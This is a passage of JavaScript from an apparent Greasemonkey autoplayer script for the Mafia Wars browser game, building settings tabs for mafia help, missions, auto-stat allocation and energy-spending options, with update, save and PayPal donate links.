  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Ask for Vegas/Italy help:'));

  var selectVegasTier = makeElement('select', rhs, {'id':id, 'title':title});
  choiceVegasTier = document.createElement('option');
  choiceVegasTier.text = 'no Help in Vegas';
  choiceVegasTier.value = '0';
  if (GM_getValue('selectVegasTier') == '0') choiceVegasTier.selected = true;
  selectVegasTier.appendChild(choiceVegasTier);

  for(i=0;i<missions.length;i++){
    if(missions[i][MISSION_CITY]==LV && missions[i][MISSION_EOL]==2){
      choiceVegasTier = document.createElement('option');
      choiceVegasTier.text = missions[i][MISSION_NAME];
      choiceVegasTier.value = i;
      if (GM_getValue('selectVegasTier') == i) choiceVegasTier.selected = true;
      selectVegasTier.appendChild(choiceVegasTier);
    }
  }

  //makeElement('br', rhs);

  id = 'selectItalyTier';
  var selectItalyTier = makeElement('select', rhs, {'id':id, 'title':title, 'style':'margin-left:0.5em;'});
  choiceItalyTier = document.createElement('option');
  choiceItalyTier.text = 'no Help in Italy';
  choiceItalyTier.value = '0';
  if (GM_getValue('selectItalyTier') == '0') choiceItalyTier.selected = true;
  selectItalyTier.appendChild(choiceItalyTier);

  for(i=0;i<missions.length;i++){
    if(missions[i][MISSION_CITY]==ITALY && missions[i][MISSION_EOL]==2){
      choiceItalyTier = document.createElement('option');
      choiceItalyTier.text = missions[i][MISSION_NAME];
      choiceItalyTier.value = i;
      if (GM_getValue('selectItalyTier') == i) choiceItalyTier.selected = true;
      selectItalyTier.appendChild(choiceItalyTier);
    }
  }

  // Auto help on crew collections
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Automatically ask for help on Crew Collections.';
  id = 'autoAskHelponCC';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title,'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Ask for help on Crew collections'));

  // Auto-accept mafia invitations
  makeElement('br', rhs);
  title = 'Automatically accept mafia invitations.';
  id = 'acceptMafiaInvitations';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title,'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Accept mafia invitations'));

  // Auto-publish Miscellaneous Stuff
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  label = makeElement('label', lhs);
  label.appendChild(document.createTextNode('Automatically publish:'));

  // Level up bonus
  title = 'Automatically post level up bonus.';
  id = 'autoLevelPublish';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title,'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Level-up bonus '));

  // Achievement bonus
  title = 'Automatically post achievement bonus.';
  id = 'autoAchievementPublish';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title,'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Achievement bonus '));

  // Share Coins
  title = 'Automatically post share coins from fighting.';
  id = 'autoShareCoins';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title,'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Share Coins '));

  // Global Publishing
  title = 'Automatically click Publish on every Post Popup.';
  id = 'autoGlobalPublishing';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title,'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Global Publishing '));

  // Iced opponent bonus
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Automatically post iced opponent bonus.';
  id = 'autoIcePublish';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title,'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Ice bonus, every '));
  title = 'Enter the publishing Frequency';
  id = 'autoIcePublishFrequency';
  makeElement('input', rhs, {'type':'text', 'value':GM_getValue(id, '1'), 'title':title, 'id':id, 'size':'1'});
  rhs.appendChild(document.createTextNode(' th time'));

  // Secret Stash
  makeElement('br', rhs, {'class':'hide'});
  title = 'Automatically post Secret Stash found while fighting.';
  id = 'autoSecretStash';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title,'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Secret stash, every '));
  title = 'Enter the publishing Frequency';
  id = 'autoSecretStashFrequency';
  makeElement('input', rhs, {'type':'text', 'value':GM_getValue(id, '1'), 'title':title, 'id':id, 'size':'1'});
  rhs.appendChild(document.createTextNode(' th time'));

  // Auto-share wishlist
  makeElement('br', rhs, {'class':'hide'});
  title = 'Check if you want to share wishlist.';
  id = 'autoShareWishlist';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title,'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Wishlist every: '));
  title = 'Enter the number of hours to wait before sharing wishlist again. Has to be at least 1 hour, and can be decimal (e.g. 1.5).';
  id = 'autoShareWishlistTime';
  makeElement('input', rhs, {'type':'text', 'value':GM_getValue(id, '1'), 'title':title, 'id':id, 'size':'2'});
  rhs.appendChild(document.createTextNode(' hour(s)'));

  // Auto-help on jobs/wars
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  label = makeElement('label', lhs);
  label.appendChild(document.createTextNode(' Automatically help: '));
  title = 'Automatically help on jobs.';
  id = 'autoHelp';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' On Jobs '));
  title = 'Automatically help on wars.';
  id = 'autoWarHelp';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' On Wars '));

  // Auto-help on burners
  title = 'Automatically supply burners.';
  id = 'autoBurnerHelp';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' On Burners '));

  // Auto-help on parts
  title = 'Automatically supply parts.';
  id = 'autoPartsHelp';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' On Parts '));

  // Option for accepting gifts
  makeElement('br', rhs, {'class':'hide'});
  title = 'Accept all gifts';
  id = 'autoGiftAccept';
  var autoGiftAcceptElt = makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id, 'title':title}).appendChild(document.createTextNode(' Automatically accept all gifts'));
  rhs.appendChild(document.createTextNode(' '));
  id = 'autoGiftAcceptChoice';
  var autoGiftAcceptChoice = makeElement('select', rhs, {'id':id});
  for (i = 0, iLength=giftAcceptChoices.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(giftAcceptChoices[i]));
    autoGiftAcceptChoice.appendChild(choice);
  }
  autoGiftAcceptChoice.selectedIndex = GM_getValue('autoGiftAcceptChoice', 0);
  rhs.appendChild(document.createTextNode(' '));
  id = 'autoGiftAcceptReward';
  var autoGiftAcceptReward = makeElement('select', rhs, {'id':id});
  for (i = 0, iLength=giftAcceptRewards.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(giftAcceptRewards[i]));
    autoGiftAcceptReward.appendChild(choice);
  }
  autoGiftAcceptReward.selectedIndex = GM_getValue('autoGiftAcceptReward', 0);

  // Option for accepting Message Center Gifts / Boosts
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  label = makeElement('label', lhs);
  label.appendChild(document.createTextNode(' Message Center: '));
  title = 'Check to autoAccept Message Center Gifts';
  id = 'autoAcceptMsgGifts';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id, 'title':title}).appendChild(document.createTextNode(' autoAccept Gifts '));
  title = 'Check to autoAccept Message Center Boosts';
  id = 'autoAcceptMsgBoosts';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id, 'title':title}).appendChild(document.createTextNode(' autoAccept Boosts'));

  // Energy pack settings?
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  label = makeElement('label', lhs);
  label.appendChild(document.createTextNode('Energy Pack Settings:'));

  title = 'Periodically ask for energy packs from your fellow mafia members.';
  id = 'askEnergyPack';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Ask for Packs '));

  title = 'Reward fellow mafia members for sending energy packs.';
  id = 'rewardEnergyPack';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Reward Mafia'));

  // NOT WORKING SO NEED TO BE FIXED
/*
  title = 'Periodically send energy packs to your fellow mafia members.';
  id = 'sendEnergyPack';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Send Packs '));
*/

  // War - Automatically declare a war
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Declare war against this opponent';
  id = 'autoWar';
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id, 'title':title}).appendChild(document.createTextNode(' Automatically declare war: '));

  // Publish war declaration
  title = 'Automatically publish this war to your mafia so they can help';
  id = 'autoWarPublish';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id, 'title':title}).appendChild(document.createTextNode(' Publish war declaration '));

  // Publish rally for help
  title = 'Automatically publish rally for help';
  id = 'autoWarRallyPublish';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id, 'title':title}).appendChild(document.createTextNode(' Publish rally for help'));

  // Publish call for back up
  title = 'Automatically publish the call for help to your mafia';
  id = 'autoWarResponsePublish';
  makeElement('br', rhs, {'class':'hide'});
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id, 'title':title}).appendChild(document.createTextNode(' Publish call for help '));

  // Publish reward
  title = 'Automatically publish that you rewarded your mafia for helping';
  id = 'autoWarRewardPublish';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id, 'title':title}).appendChild(document.createTextNode(' Publish reward'));

  // War mode
  id = 'warMode';
  var warModes = makeElement('select', lhs, {'id':id});
  for (i = 0, iLength=warModeChoices.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(warModeChoices[i]));
    warModes.appendChild(choice);
  }
  warModes.selectedIndex = GM_getValue('warMode', 0);

  // War - autowar targets
  title = 'Enter opponents Mafia Wars ID';
  id = 'autoWarTargetList';
  var warListLabel = makeElement('font', lhs, {'style':'font-size: 10px;'});
  warListLabel.appendChild(document.createTextNode('Enter each target on a separate line. Add the userid part of the p|userid.'));
  makeElement('br', rhs, {'class':'hide'});
  var warList = makeElement('textarea', lhs, {'style':'width: 12em; height: 6em;', 'id':id, 'title':'Enter each Mafia Wars ID on a separate line. This will not work with the Facebook ID.'});
  warList.appendChild(document.createTextNode(GM_getValue('autoWarTargetList', '')));
  makeElement('br', rhs, {'class':'hide'});

  // Hide list if war mode is random
  var warModeHandler = function () {
    warList.style.display = warModes.selectedIndex == 0 ? 'none' : '';
    warListLabel.style.display = warModes.selectedIndex == 0 ? 'none' : '';
  };
  warModeHandler();
  warModes.addEventListener('change', warModeHandler, false);

  return mafiaTab;
}
//// Create Missions Tab
function createHelpMissionsTab() {
  var elt, title, id, label, item, lhs, rhs, i, choice, div;
  var HelpMissionsTab = makeElement('div', null, {'id':'HelpMissionsTab', 'class':'tabcontent'});

  var eltCol = makeElement('div', HelpMissionsTab, {'style':'width:762px;height:25px;'});
  var eltA = makeElement('a', eltCol, {'href':'http://www.playerscripts.com/ps-mwap-forum.html','target':'_none','class':'helpLink'});

  if (gvar.isGreaseMonkey) {
    eltA = makeElement('a', eltCol, {'href':'#','alt':'update','title':'update','style':'width:43px;margin-right:10px;','class':'settingsLink'});
    eltA.appendChild(document.createTextNode('Update'));
    eltA.addEventListener('click', updateScript, false);
  }

  eltA = makeElement('a', eltCol, {'href':'#','alt':'save settings','title':'save setttings','style':'width:84px;','class':'settingsLink'});
  eltA.appendChild(document.createTextNode('Save Settings'));
  eltA.addEventListener('click', saveSettings, false);

  var eltForm = makeElement('form', eltCol,{'action':'https://www.paypal.com/cgi-bin/webscr','method':'post','name':'MWAPDonateLink','target':'_blank'});
  eltA = makeElement('input', eltForm,{'name':'cmd','type':'hidden','value':'_s-xclick'});
  eltA = makeElement('input', eltForm,{'name':'hosted_button_id','type':'hidden','value':'ST6BSZGFQXCUY'});
  eltA = makeElement('a', eltForm, {'name':'submit','href':'#','target':'_blank','onclick':'document.MWAPDonateLink.submit();return false;','alt':'PayPal - The safer, easier way to pay online.','title':'PayPal - The safer, easier way to pay online.','style':'width:50px;','class':'settingsLink'});
  eltA.appendChild(document.createTextNode('Donate'));

  var TabHeader = makeElement('div', eltCol, {'style':'width:500px;height:25px;border:none #FFFFFF;float:left;font-size: 18px; font-weight: bold;'});
  TabHeader.appendChild(document.createTextNode('Mission and Mission Help Settings:'));

  var statDiv = makeElement('div', HelpMissionsTab, {'style':'position: absolute; width: 100%; left: 50px; top: 40px;'});

  // enable Missions
  id = 'AutoMafiaMission';
  title = 'Participate In Mafia Missions';
  var AutoMafiaMission = makeElement('div', statDiv, {'style':'position: absolute; text-align: left; top: 25px; left: 10px;'});
  makeElement('input', AutoMafiaMission, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', AutoMafiaMission, {'for':id,'title':title}).appendChild(document.createTextNode(' Enable Mafia Missions '));

  // ask for Mission help
  id = 'AskMissionHelp';
  title = 'Ask For Help In Your Missions';
  var AskMissionHelp = makeElement('div', statDiv, {'style':'position: absolute; text-align: left; top: 45px; left: 10px;'});
  makeElement('input', AskMissionHelp, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', AskMissionHelp, {'for':id,'title':title}).appendChild(document.createTextNode(' Ask For Mission Help '));

  // enable Mission Reward Collection
  id = 'AutoMafiaCollection';
  title = 'Collect Mafia Mission Rewards';
  var AutoMafiaCollection = makeElement('div', statDiv, {'style':'position: absolute; text-align: left; top: 65px; left: 10px;'});
  makeElement('input', AutoMafiaCollection, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', AutoMafiaCollection, {'for':id,'title':title}).appendChild(document.createTextNode(' Collect Mission Rewards '));

  // enable Mission Reward Sharing
  id = 'autoShareRewards';
  title = 'Automatically Share Rewards';
  var autoShareRewards = makeElement('div', statDiv, {'style':'position: absolute; text-align: left; top: 85px; left: 10px;'});
  makeElement('input', autoShareRewards, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', autoShareRewards, {'for':id,'title':title}).appendChild(document.createTextNode(' Automatically Share Mission Rewards '));

  // enable Missions Jobs
  id = 'AutoMafiaJob';
  title = 'Help In Mafia Mission Jobs';
  var AutoMafiaJob = makeElement('div', statDiv, {'style':'position: absolute; text-align: left; top: 105px; left: 10px;'});
  makeElement('input', AutoMafiaJob, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', AutoMafiaJob, {'for':id,'title':title}).appendChild(document.createTextNode(' Do Mission Jobs '));

  // enable Auto-Remove from Missions
  id = 'AutoMafiaRemoved';
  title = 'Clear Removed From Mission If You Have Been Removed From A Mission';
  var AutoMafiaRemoved = makeElement('div', statDiv, {'style':'position: absolute; text-align: left; top: 125px; left: 10px;'});
  makeElement('input', AutoMafiaRemoved, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', AutoMafiaRemoved, {'for':id,'title':title}).appendChild(document.createTextNode(' Clear Any Removed From Mission'));

  return HelpMissionsTab;
}

//// Create Autostat Tab
function createAutostatTab() {
  var title, id, label, i, j, choice, div;
  var autostatTab = makeElement('div', null, {'id':'autostatTab', 'class':'tabcontent'});

  var eltCol = makeElement('div', autostatTab, {'style':'width:762px;height:25px;'});
  var eltA = makeElement('a', eltCol, {'href':'http://www.playerscripts.com/ps-mwap-forum.html','target':'_none','class':'helpLink'});

  if (gvar.isGreaseMonkey) {
    eltA = makeElement('a', eltCol, {'href':'#','alt':'update','title':'update','style':'width:43px;margin-right:10px;','class':'settingsLink'});
    eltA.appendChild(document.createTextNode('Update'));
    eltA.addEventListener('click', updateScript, false);
  }

  eltA = makeElement('a', eltCol, {'href':'#','alt':'save settings','title':'save setttings','style':'width:84px;','class':'settingsLink'});
  eltA.appendChild(document.createTextNode('Save Settings'));
  eltA.addEventListener('click', saveSettings, false);

  var eltForm = makeElement('form', eltCol,{'action':'https://www.paypal.com/cgi-bin/webscr','method':'post','name':'MWAPDonateLink','target':'_blank'});
  eltA = makeElement('input', eltForm,{'name':'cmd','type':'hidden','value':'_s-xclick'});
  eltA = makeElement('input', eltForm,{'name':'hosted_button_id','type':'hidden','value':'ST6BSZGFQXCUY'});
  eltA = makeElement('a', eltForm, {'name':'submit','href':'#','target':'_blank','onclick':'document.MWAPDonateLink.submit();return false;','alt':'PayPal - The safer, easier way to pay online.','title':'PayPal - The safer, easier way to pay online.','style':'width:50px;','class':'settingsLink'});
  eltA.appendChild(document.createTextNode('Donate'));

  var TabHeader = makeElement('div', eltCol, {'style':'width:500px;height:25px;border:none #FFFFFF;float:left;font-size: 18px; font-weight: bold;'});
  TabHeader.appendChild(document.createTextNode('Autostat Settings:'));

  var statDiv = makeElement('div', autostatTab, {'style':'position: absolute; width: 100%; left: 50px; top: 40px;'});

  id = 'autoStat';
  title = 'Check this this to enable auto-statting';
  var autoStats = makeElement('div', statDiv, {'style':'position: absolute; text-align: left; left: 20px;'});
  makeElement('input', autoStats, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('img', autoStats, {'src':stripURI(plussignIcon)});
  makeElement('label', autoStats, {'for':id, 'title':title}).appendChild(document.createTextNode(' Enable auto-stat'));

  title = ' Disable AutoStat when status goals are reached';
  id = 'autoStatDisable';
  var divStatDisable = makeElement('div', statDiv, {'style':'position: absolute; text-align: left; left: 200px; '});
  makeElement('input', divStatDisable, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('label', divStatDisable, {'for':id, 'title':title}).appendChild(document.createTextNode(title));

  // Display Adjustments
  var xTop = 30;
  var yLeft = 10;

  // Status Labels
  var yLeftCur = yLeft + 20;
  var xTopCur = xTop +2;

  // Stat labels
  for (i = 0, iLength=autoStatRatios.length; i < iLength; ++i ) {
    div = makeElement('div', statDiv, {'style':'position: absolute; top:' + xTopCur + 'px; left:' + yLeftCur + 'px;'});
    div.appendChild(document.createTextNode(autoStatDescrips[i + 1]));

    xTopCur += 25;
  }

  // Status ratio
  yLeftCur = yLeft + 75;
  xTopCur = xTop;

  for (i = 0, iLength=autoStatRatios.length; i < iLength; ++i ) {
    title = 'Please set ratio of ' + autoStatDescrips[i + 1] + ' stat';
    id = autoStatRatios[i];
    div = makeElement('div', statDiv, {'style':'position: absolute; top:' + xTopCur + 'px; left:' + yLeftCur + 'px;', 'title':title});
    div.appendChild(document.createTextNode(' = '));
    makeElement('input', div, {'type':'text', 'style':'width: 40px;', 'value':GM_getValue(id, 0), 'id':id, 'size':'1'});
    div.appendChild(document.createTextNode(' x '));

    xTopCur += 25;
  }

  // Status Allocation Mode Settings
  yLeftCur = yLeft + 150;
  xTopCur = xTop;

  for (i = 0, iLength=autoStatModes.length; i < iLength; ++i ) {
    title = 'Please select where to base ' + autoStatDescrips[i + 1] + ' stat';
    id = autoStatModes[i];
    var sel = makeElement('select', statDiv, {'id':id, 'title':title, 'style':'position: absolute; width:60px; top: ' + xTopCur + 'px; left: ' + yLeftCur + 'px;'});
    xTopCur += 25;
    for (j = 0, jLength=autoStatDescrips.length; j < jLength; ++j) {
      choice = document.createElement('option');
      choice.value = j;
      choice.appendChild(document.createTextNode(autoStatDescrips[j]));
      sel.appendChild(choice);
    }
    sel.selectedIndex = GM_getValue(autoStatModes[i], 0);
  }

  // Status base
  yLeftCur = yLeft + 215;
  xTopCur = xTop;

  for (i = 0, iLength=autoStatBases.length; i < iLength; ++i ) {
    title = 'add these for total ';
    id = autoStatBases[i];
    div = makeElement('div', statDiv, {'style':'position: absolute; top:' + xTopCur + 'px; left:' + yLeftCur + 'px;', 'title':title});
    div.appendChild(document.createTextNode(' + '));
    makeElement('input', div, {'type':'text', 'style':'width: 40px;', 'value':GM_getValue(id, 0), 'id':id, 'size':'1'});
    xTopCur += 25;
  }

  // Left-over points
  yLeftCur = yLeft + 280;
  xTopCur = xTop;

  for (i = 0, iLength=autoStatFallbacks.length; i < iLength; ++i ) {
    title = 'Check this to distribute points to ' + autoStatDescrips[i + 1] + ' when goals are reached';
    id = autoStatFallbacks[i];
    div = makeElement('div', statDiv, {'style':'position: absolute; top: ' + xTopCur + 'px; left:' + yLeftCur + 'px; '});
    makeElement('input', div, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, autoStatFallbacks[i]);
    label = makeElement('label', div, {'for':id, 'title':title});
    label.appendChild(document.createTextNode(' ' + autoStatDescrips[i+1] + ' as fallback'));
    xTopCur += 25;
  }

  // Priority Settings
  title = 'Please select priority level for stat distribution';
  yLeftCur = yLeft + 460;
  xTopCur = xTop;

  for (i = 0, iLength=autoStatPrios.length; i < iLength; ++i ) {
    id = autoStatPrios[i];
    sel = makeElement('select', statDiv, {'id':id, 'title':title,'style':'position: absolute; top: ' + xTopCur + 'px; left: ' + yLeftCur + 'px;'});
    xTopCur += 25;
    for (j = 0, jLength=autoStatRatios.length; j < jLength; ++j) {
      choice = document.createElement('option');
      choice.value = j;
      choice.appendChild(document.createTextNode('Priority ' + (j + 1)));
      sel.appendChild(choice);
    }
    sel.selectedIndex = GM_getValue(autoStatPrios[i], 0);
  }

  id = 'autoResetTimers';
  title = 'Check this to reset timers on PS MWAP startup';
  var autoResetTimers = makeElement('div', statDiv, {'style':'position: absolute; text-align: left; top: 200px; left: 20px;'});
  makeElement('input', autoResetTimers, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', autoResetTimers, {'for':id, 'title':title}).appendChild(document.createTextNode(' Enable auto-ResetTimers'));


  // Enforce Title
  id = 'autoEnforcedTitle';
  title = 'Change your MW title';
  var autoEnforcedTitleSelect = makeElement('div', statDiv, {'style':'position: absolute; text-align: left; top: 250px; left: 20px;width:95%;'});
  makeElement('label', autoEnforcedTitleSelect, {'for':id, 'title':title}).appendChild(document.createTextNode('Enforce a New Title : '));

  var autoEnforcedTitle = makeElement('select', autoEnforcedTitleSelect, {'id':id, 'title':title, 'style':'margin-left:0.5em'});
  chooseTitle = document.createElement('option');
  chooseTitle.text = 'Do not Enforce a New Title';
  chooseTitle.value = '';
  if (GM_getValue('autoEnforcedTitle') == '') chooseTitle.selected = true;
  autoEnforcedTitle.appendChild(chooseTitle);

  for(i=0, iLength = mwTitles.length;i < iLength;++i){
    chooseTitle = document.createElement('option');
    chooseTitle.text = mwTitles[i];
    chooseTitle.value = mwTitles[i];
    if (GM_getValue('autoEnforcedTitle') == mwTitles[i]) chooseTitle.selected = true;
    autoEnforcedTitle.appendChild(chooseTitle);
  }

  title = 'Enter the number of hours to wait before changing the title again. Has to be at least 1 hour, and can be decimal (e.g. 1.5).';
  id = 'autoEnforcedTitleTime';
  makeElement('label', autoEnforcedTitleSelect, {'for':id, 'title':title,'style':'margin-left: 200px;'}).appendChild(document.createTextNode(' every '));
  makeElement('input', autoEnforcedTitleSelect, {'type':'text', 'value':GM_getValue(id, '2'), 'title':title, 'id':id, 'size':'1'});
  autoEnforcedTitleSelect.appendChild(document.createTextNode(' hour(s)'));

  return autostatTab;
}

// Create Energy Tab
function createEnergyTab() {
  var elt, title, id, label, item, rhs, lhs, choice;
  var energyTab = makeElement('div', null, {'id':'energyTab', 'class':'tabcontent'});

  var eltCol = makeElement('div', energyTab, {'style':'width:762px;height:25px;'});
  var eltA = makeElement('a', eltCol, {'href':'http://www.playerscripts.com/ps-mwap-forum.html','target':'_none','class':'helpLink'});

  if (gvar.isGreaseMonkey) {
    eltA = makeElement('a', eltCol, {'href':'#','alt':'update','title':'update','style':'width:43px;margin-right:10px;','class':'settingsLink'});
    eltA.appendChild(document.createTextNode('Update'));
    eltA.addEventListener('click', updateScript, false);
  }

  eltA = makeElement('a', eltCol, {'href':'#','alt':'save settings','title':'save setttings','style':'width:84px;','class':'settingsLink'});
  eltA.appendChild(document.createTextNode('Save Settings'));
  eltA.addEventListener('click', saveSettings, false);

  var eltForm = makeElement('form', eltCol,{'action':'https://www.paypal.com/cgi-bin/webscr','method':'post','name':'MWAPDonateLink','target':'_blank'});
  eltA = makeElement('input', eltForm,{'name':'cmd','type':'hidden','value':'_s-xclick'});
  eltA = makeElement('input', eltForm,{'name':'hosted_button_id','type':'hidden','value':'ST6BSZGFQXCUY'});
  eltA = makeElement('a', eltForm, {'name':'submit','href':'#','target':'_blank','onclick':'document.MWAPDonateLink.submit();return false;','alt':'PayPal - The safer, easier way to pay online.','title':'PayPal - The safer, easier way to pay online.','style':'width:50px;','class':'settingsLink'});
  eltA.appendChild(document.createTextNode('Donate'));

  var TabHeader = makeElement('div', eltCol, {'style':'width:500px;height:25px;border:none #FFFFFF;float:left;font-size: 18px; font-weight: bold;'});
  TabHeader.appendChild(document.createTextNode('Energy Settings:'));

  // Container for a list of settings.
  var list = makeElement('div', energyTab, {'style':'position: relative; top: 0px; margin-left: auto; margin-right: auto; width: 95%; line-height:120%;'});

  // How to spend energy
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});

  title = 'Spend energy automatically.';
  id = 'autoMission';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, 'autoMission');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Spend energy to perform any combination of jobs'));
  makeElement('br', rhs, {'class':'hide'});

  // Optimize at end level option
  //var jobOptions = makeElement('div', lhs, {'id':'jobOptions'});
  id = 'endLevelOptimize';
  title = 'Optimize at end level';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'vertical-align:middle', 'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' ' + title));

  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});

  var unChkAll = makeElement('input', lhs, {'id':'unCheckAll','style':'font-size: 10px;padding:2px;','type':'button', 'value':'Uncheck All'});
  //
  // Job selector.
  //
  var selectMissionM = makeElement('div', rhs, {'id':id + 'M', 'title':'Missions Array', 'style':'overflow: auto; width: 300px; height: 150px; border:1px solid #999999; padding: 2px 2px 2px 2px'});

  // Master tier selection pull down.
  var selectTierDiv = makeElement('div', list);
  lhs = makeElement('div', selectTierDiv, {'class':'lhs'});
  rhs = makeElement('div', selectTierDiv, {'class':'rhs'});
  makeElement('br', selectTierDiv, {'class':'hide'});
  title = 'Master Tier';
  id = 'selectTier';
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Master tier:'));
  var selectTier = makeElement('select', rhs, {'id':id, 'title':title});
  choiceTier = document.createElement('option');
  choiceTier.text = 'Do not master anything';
  choiceTier.value = '0.0';
  selectTier.appendChild(choiceTier);

  // Create the rows of the list.
  var cityno = -1;
  var tabno = -1;
  var divChoice, choiceM, choiceS;

  var chkHandler = function () {
    var eltId = this.getAttribute('chkId');
    var chkElt = document.getElementById(eltId);
    var chkImgElt = document.getElementById('img' + eltId);

    if (chkElt) {
      if(chkElt.checked) {
        chkElt.checked = false;
        chkImgElt.src=stripURI(unCheckedIcon);
      } else {
        chkElt.checked = 'checked';
        chkImgElt.src=stripURI(checkedIcon);
      }
    }
  };

  var tmpListArray = getSavedList('selectMissionMultiple');

